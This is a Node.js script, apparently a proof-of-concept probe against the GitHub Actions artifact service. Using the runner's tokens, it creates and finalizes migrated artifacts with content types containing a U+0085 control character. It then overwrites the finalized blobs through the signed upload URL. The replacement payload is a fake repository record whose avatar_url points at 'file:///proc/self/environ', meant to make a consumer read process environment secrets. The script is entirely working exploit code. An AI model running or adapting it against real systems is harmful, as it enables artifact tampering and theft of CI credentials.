import https from 'node:https';
import {createHash} from 'node:crypto';

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const results = process.env.ACTIONS_RESULTS_URL;
const ghToken = process.env.GITHUB_TOKEN;
const scope = JSON.parse(Buffer.from(token.split('.')[1], 'base64url')).scp
  .split(' ').find(value => value.startsWith('Actions.Results:'));
const runBackendId = scope.split(':')[1];

function request(url, options = {}, data) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, res => {
      const chunks = [];
      res.on('data', chunk => chunks.push(chunk));
      res.on('end', () => resolve({status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks)}));
    });
    req.on('error', reject);
    req.setTimeout(18000, () => req.destroy(new Error('request timeout')));
    if (data !== undefined) req.write(data);
    req.end();
  });
}

async function rpc(method, payload) {
  const body = Buffer.from(JSON.stringify(payload));
  const url = new URL(`/twirp/github.actions.results.api.v1.ArtifactService/${method}`, results);
  return request(url, {
    method: 'POST',
    headers: {authorization: `Bearer ${token}`, accept: 'application/json',
      'content-type': 'application/json', 'content-length': body.length},
  }, body);
}

async function put(url, body, mime) {
  return request(url, {method: 'PUT', headers: {
    'x-ms-blob-type': 'BlockBlob',
    'x-ms-blob-content-type': mime,
    'content-type': mime,
    'content-length': body.length,
  }}, body);
}

function mimeHex(response) {
  return Buffer.from(response?.headers['content-type'] || '', 'latin1').toString('hex');
}

for (const [label, mime] of [['leading', '\u0085application/json'], ['trailing', 'application/json\u0085']]) {
  const name = `cassette-migrated-${process.env.GITHUB_RUN_ID}-${label}`;
  const created = await rpc('MigrateArtifact', {workflow_run_backend_id: runBackendId, name});
  console.log('CREATE', JSON.stringify({label, status: created.status,
    body: created.body.toString().replace(/https:\/\/[^" ]+/g, '<URL>').slice(0, 220)}));
  if (created.status !== 200) continue;
  const uploadUrl = JSON.parse(created.body).signed_upload_url;
  if (!uploadUrl) continue;
  const firstBody = Buffer.from('{"probe":"migration-placeholder"}');
  const uploaded = await put(uploadUrl, firstBody, mime);
  console.log('UPLOAD', JSON.stringify({label, status: uploaded.status,
    body: uploaded.body.toString().slice(0, 160)}));
  if (uploaded.status !== 201) continue;
  const finalized = await rpc('FinalizeMigratedArtifact', {
    workflow_run_backend_id: runBackendId, name, size: String(firstBody.length),
  });
  console.log('FINALIZE', JSON.stringify({label, status: finalized.status,
    body: finalized.body.toString().slice(0, 200)}));
  if (finalized.status !== 200) continue;
  const id = String(JSON.parse(finalized.body).artifact_id);
  const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
  const payload = Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette migrated probe', stargazers_count: 0,
  }));
  const overwritten = await put(uploadUrl, payload, mime);
  const rest = await request(`https://api.github.com/repos/${repository}`, {headers: {
    authorization: `Bearer ${ghToken}`, accept: 'application/vnd.github.v3+json',
    'user-agent': 'repo-cassette-owned-migration-probe',
  }});
  const location = rest.headers.location;
  const raw = location ? await request(location) : null;
  console.log('RESULT', JSON.stringify({label, id, overwriteStatus: overwritten.status,
    restStatus: rest.status, rsct: location ? new URL(location).searchParams.get('rsct') : null,
    finalStatus: raw?.status, finalMimeHex: mimeHex(raw), bodyMatch: raw?.body.equals(payload),
    bodySha: raw ? createHash('sha256').update(raw.body).digest('hex') : null,
  }));
}
